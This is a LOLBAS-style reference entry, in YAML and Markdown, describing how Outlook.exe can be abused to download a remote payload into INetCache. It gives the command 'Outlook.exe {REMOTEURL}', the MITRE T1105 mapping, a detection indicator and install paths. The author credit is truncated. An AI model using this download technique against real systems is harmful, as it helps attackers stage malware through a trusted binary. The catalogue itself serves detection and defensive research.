---
Acknowledgement:
- Person: Nir Chako (Pente
Author: Nir Chako
Commands:
- Category: Download
  Command: Outlook.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache.
Created: 2022-11-08
Description: Microsoft Office component
Detection:
- IOC: Suspicious Office application Internet/network traffic
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Outlook.exe
- Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Outlook.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\Outlook.exe
- Path: C:\Program Files\Microsoft Office\Office16\Outlook.exe
- Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\Outlook.exe
- Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\Outlook.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\Outlook.exe
- Path: C:\Program Files\Microsoft Office\Office15\Outlook.exe
- Path: C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\Outlook.exe
- Path: C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\Outlook.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office14\Outlook.exe
- Path: C:\Program Files\Microsoft Office\Office14\Outlook.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office12\Outlook.exe
- Path: C:\Program Files\Microsoft Office\Office12\Outlook.exe
- Path: C:\Program Files\Microsoft Office\Office12\Outlook.exe
Name: Outlook.exe
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/othermsbinaries
---

# Outlook.exe

Microsoft Office component

# Path(s)

- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Outlook.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Outlook.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\Outlook.exe`
- `C:\Program Files\Microsoft Office\Office16\Outlook.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\Outlook.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\Outlook.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\Outlook.exe`
- `C:\Program Files\Microsoft Office\Office15\Outlook.exe`
- `C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\Outlook.exe`
- `C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\Outlook.exe`
- `C:\Program Files (x86)\Microsoft Office\Office14\Outlook.exe`
- `C:\Program Files\Microsoft Office\Office14\Outlook.exe`
- `C:\Program Files (x86)\Microsoft Office\Office12\Outlook.exe`
- `C:\Program Files\Microsoft Office\Office12\Outlook.exe`
- `C:\Program Files\Microsoft Office\Office12\Outlook.exe`

# Download Commands

Downloads payload from remote server

```batch
Outlook.exe {REMOTEURL}
```

- **Usecase:** It will download a remote payload and place it in INetCache.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows


# Acknowledgements

- Nir Chako (Authored, 2022-11-08)
- Nir Chako (Pente